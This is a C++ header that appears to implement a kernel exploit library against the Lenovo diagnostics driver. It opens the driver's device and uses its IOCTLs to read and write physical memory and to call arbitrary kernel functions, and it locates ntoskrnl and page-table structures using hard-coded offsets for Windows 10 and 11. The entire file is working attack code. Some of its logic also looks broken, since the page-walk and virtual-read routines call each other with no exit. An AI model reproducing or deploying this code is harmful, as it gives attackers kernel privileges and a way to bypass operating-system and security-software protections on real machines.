#pragma once
#include <Windows.h>
#include <winternl.h>
#include <string>
#include <iostream>
#include <vector>
#include <memory>
#include <cstdint>
#include <psapi.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "psapi")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace ldiagd
{
    constexpr auto IOCTL_PHYS_RD = 0x222010;
    constexpr auto IOCTL_PHYS_WR = 0x222014;
    constexpr auto IOCTL_CALL_FUNCTION = 0x222000;

    // Offsets for Windows 10 22H2 / Windows 11 - change if needed
    constexpr auto OFFSET_MI_GET_PTE_ADDRESS = 0x30D8F0;
    constexpr auto OFFSET_MM_ALLOCATE_INDEPENDENT_PAGES = 0x7A21F0;
    constexpr auto OFFSET_MM_SET_PAGE_PROTECTION = 0x3A5D10;

    using UINT64 = unsigned __int64;
    using ULONG = unsigned long;
    using USHORT = unsigned short;

    struct CALL_DATA
    {
        UINT64 FunctionAddr;
        UINT64 Arg1;
        UINT64 Arg2;
        UINT64 Arg3;
        UINT64 Arg4;
        UINT64 CallResult0;
    };

    struct LDIAG_READ
    {
        DWORD64 data;
        DWORD64 wLen;
    };

    struct LDIAG_WRITE
    {
        DWORD64 _where;
        DWORD dwMapSize;
        DWORD dwLo;
        DWORD64 _what_ptr;
    };

    struct FILL_PTE_HIERARCHY
    {
        UINT64 PXE;
        UINT64 PPE;
        UINT64 PDE;
        UINT64 PTE;
    };

    union PAGE_TABLE_ENTRY
    {
        struct
        {
            UINT64 Present : 1;
            UINT64 ReadWrite : 1;
            UINT64 UserSupervisor : 1;
            UINT64 PageLevelWriteThrough : 1;
            UINT64 PageLevelCacheDisable : 1;
            UINT64 Accessed : 1;
            UINT64 Dirty : 1;
            UINT64 PAT : 1;
            UINT64 Global : 1;
            UINT64 CopyOnWrite : 1;
            UINT64 Prototype : 1;
            UINT64 Write : 1;
            UINT64 Pfn : 40;
            UINT64 Reserved : 11;
            UINT64 NxE : 1;
        } flags;
        UINT64 value;
    };

    enum class PageType { UsePte, UsePde };

    class MemoryManager
    {
    public:
        HANDLE hDevice = INVALID_HANDLE_VALUE;
        UINT64 physSwapAddr = 0;
        UINT64 NtosBase = 0;
        UINT64 PteBase = 0;

        ULONG mi_get_pte_address_offset = OFFSET_MI_GET_PTE_ADDRESS;
        ULONG mm_allocate_independent_pages_offset = OFFSET_MM_ALLOCATE_INDEPENDENT_PAGES;
        ULONG mm_set_page_protection_offset = OFFSET_MM_SET_PAGE_PROTECTION;

        const char* deviceName = R"(\\.\LenovoDiagnosticsDriver)";

        MemoryManager() = default;

        ~MemoryManager()
        {
            Shutdown();
        }

        BOOL Initialize()
        {
            for (int i = 0; i < 10; i++)
            {
                hDevice = CreateFileA(deviceName, GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                if (hDevice != INVALID_HANDLE_VALUE)
                    break;

                Sleep(100);
            }

            if (hDevice == INVALID_HANDLE_VALUE)
            {
                std::cerr << "[-] Failed to open Lenovo device: " << GetLastError() << std::endl;
                return FALSE;
            }

            std::cout << "[+] Device opened successfully\n";

            NtosBase = FindNtosBase();
            if (!NtosBase)
            {
                std::cerr << "[-] Failed to find ntoskrnl base" << std::endl;
                CloseHandle(hDevice);
                hDevice = INVALID_HANDLE_VALUE;
                return FALSE;
            }

            std::cout << "[+] ntoskrnl base: 0x" << std::hex << NtosBase << std::dec << "\n";

            physSwapAddr = FindPhysSwapSpace();
            if (!physSwapAddr)
            {
                std::cerr << "[-] Failed to find physical swap space" << std::endl;
                CloseHandle(hDevice);
                hDevice = INVALID_HANDLE_VALUE;
                return FALSE;
            }

            std::cout << "[+] Physical swap space: 0x" << std::hex << physSwapAddr << std::dec << "\n";

            PteBase = GetPteBase();
            if (!PteBase)
            {
                std::cout << "[!] Warning: Could not read PteBase, using default\n";
                PteBase = 0xFFFF800000000000;
            }

            std::cout << "[+] PTE base: 0x" << std::hex << PteBase << std::dec << "\n";

            return TRUE;
        }

        BOOL IsInitialized() const
        {
            return hDevice != INVALID_HANDLE_VALUE;
        }

        void Shutdown()
        {
            if (hDevice != INVALID_HANDLE_VALUE)
            {
                CloseHandle(hDevice);
                hDevice = INVALID_HANDLE_VALUE;
            }
        }

        UINT64 CallKernelFunction(UINT64 address, UINT64 arg1 = 0, UINT64 arg2 = 0,
            UINT64 arg3 = 0, UINT64 arg4 = 0)
        {
            if (!address || hDevice == INVALID_HANDLE_VALUE) return 0;

            CALL_DATA data = {};
            UINT64 result = 0;
            data.FunctionAddr = address;
            data.Arg1 = arg1;
            data.Arg2 = arg2;
            data.Arg3 = arg3;
            data.Arg4 = arg4;
            data.CallResult0 = reinterpret_cast<UINT64>(&result);

            DWORD returned = 0;
            DeviceIoControl(hDevice, IOCTL_CALL_FUNCTION, &data, sizeof(data),
                &data, sizeof(data), &returned, NULL);
            return result;
        }

        template <typename T>
        BOOL ReadPhysData(UINT64 address, T* data)
        {
            if (!data || hDevice == INVALID_HANDLE_VALUE) return FALSE;

            LDIAG_READ lr = { address, sizeof(T) };
            UINT64 outbuffer = 0;
            DWORD returned = 0;

            if (!DeviceIoControl(hDevice, IOCTL_PHYS_RD, &lr, sizeof(lr),
                &outbuffer, sizeof(outbuffer), &returned, NULL))
                return FALSE;

            *data = static_cast<T>(outbuffer);
            return TRUE;
        }

        template <typename T>
        BOOL WritePhysData(UINT64 address, T* data)
        {
            if (!data || hDevice == INVALID_HANDLE_VALUE) return FALSE;

            LDIAG_WRITE lw = { address, static_cast<DWORD>(sizeof(T)), 0x6C61696E,
                              reinterpret_cast<UINT64>(data) };
            DWORD returned = 0;
            return DeviceIoControl(hDevice, IOCTL_PHYS_WR, &lw, sizeof(lw),
                NULL, 0, &returned, NULL);
        }

        template <typename T>
        BOOL ReadVirtData(UINT64 address, T* data)
        {
            if (!data) return FALSE;

            PAGE_TABLE_ENTRY pte = {};
            PageType pt = GetPageTypeForVirtualAddress(address, &pte);

            if (pt == PageType::UsePde && pte.value == 0)
                return FALSE;

            UINT64 phys = (pte.flags.Pfn << 12) | (address & 0xFFF);
            return ReadPhysData(phys, data);
        }

        template <typename T>
        BOOL WriteVirtData(UINT64 address, T* data)
        {
            if (!data) return FALSE;

            PAGE_TABLE_ENTRY pte = {};
            PageType pt = GetPageTypeForVirtualAddress(address, &pte);

            if (pt == PageType::UsePde && pte.value == 0)
                return FALSE;

            UINT64 phys = (pte.flags.Pfn << 12) | (address & 0xFFF);
            return WritePhysData(phys, data);
        }

        UINT64 GetKernelExport(const char* function_name)
        {
            HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
            if (!hNtos) return 0;

            PVOID proc = GetProcAddress(hNtos, function_name);
            if (!proc)
            {
                FreeLibrary(hNtos);
                return 0;
            }

            UINT64 rva = reinterpret_cast<UINT64>(proc) - reinterpret_cast<UINT64>(hNtos);
            FreeLibrary(hNtos);
            return NtosBase + rva;
        }

    private:
        std::unique_ptr<FILL_PTE_HIERARCHY> CreatePteHierarchy(UINT64 VirtualAddress)
        {
            auto retval = std::make_unique<FILL_PTE_HIERARCHY>();
            UINT64 temp = VirtualAddress;

            temp >>= 9; temp &= 0x7FFFFFFFF8; retval->PTE = temp + PteBase;
            temp >>= 9; temp &= 0x7FFFFFFFF8; retval->PDE = temp + PteBase;
            temp >>= 9; temp &= 0x7FFFFFFFF8; retval->PPE = temp + PteBase;
            temp >>= 9; temp &= 0x7FFFFFFFF8; retval->PXE = temp + PteBase;

            return retval;
        }

        UINT64 FindPhysSwapSpace()
        {
            for (UINT64 addr = 0x1000; addr < 0x10000000; addr += 0x1000)
            {
                UINT64 val = 0;
                if (ReadPhysData(addr, &val) && val == 0)
                    return addr;
            }
            return 0;
        }

        UINT64 GetPteBase()
        {
            if (!NtosBase) return 0;
            UINT64 addr = NtosBase + mi_get_pte_address_offset + 0x13;
            UINT64 base = 0;
            ReadVirtData(addr, &base);
            return base;
        }

        PageType GetPageTypeForVirtualAddress(UINT64 VirtAddress, PAGE_TABLE_ENTRY* PageTableEntry)
        {
            auto hierarchy = CreatePteHierarchy(VirtAddress);

            if (!ReadVirtData(hierarchy->PTE, &PageTableEntry->value))
            {
                return PageType::UsePde;
            }

            if (PageTableEntry->value == 0)
            {
                if (!ReadVirtData(hierarchy->PDE, &PageTableEntry->value))
                {
                    return PageType::UsePde;
                }
                return PageType::UsePde;
            }

            return PageType::UsePte;
        }

        UINT64 FindNtosBase()
        {
            // Method 1: EnumDeviceDrivers (simplest and most reliable)
            LPVOID drivers[1024];
            DWORD cbNeeded;

            if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID))
            {
                return (UINT64)drivers[0];
            }

            // Method 2: NtQuerySystemInformation fallback
            auto NtQuerySystemInformation = (NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG))
                GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

            if (!NtQuerySystemInformation)
                return 0;

            ULONG len = 0;
            NtQuerySystemInformation(0x0B, NULL, 0, &len);

            if (len == 0)
                return 0;

            PVOID buf = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buf)
                return 0;

            NTSTATUS status = NtQuerySystemInformation(0x0B, buf, len, &len);
            if (!NT_SUCCESS(status))
            {
                VirtualFree(buf, 0, MEM_RELEASE);
                return 0;
            }

            struct {
                ULONG ModulesCount;
                struct {
                    PVOID Reserved1;
                    PVOID Reserved2;
                    PVOID ImageBase;
                    // ... other fields we don't care about
                } Module;
            } *info = (decltype(info))buf;

            UINT64 base = (UINT64)info->Module.ImageBase;
            VirtualFree(buf, 0, MEM_RELEASE);
            return base;
        }
    };
}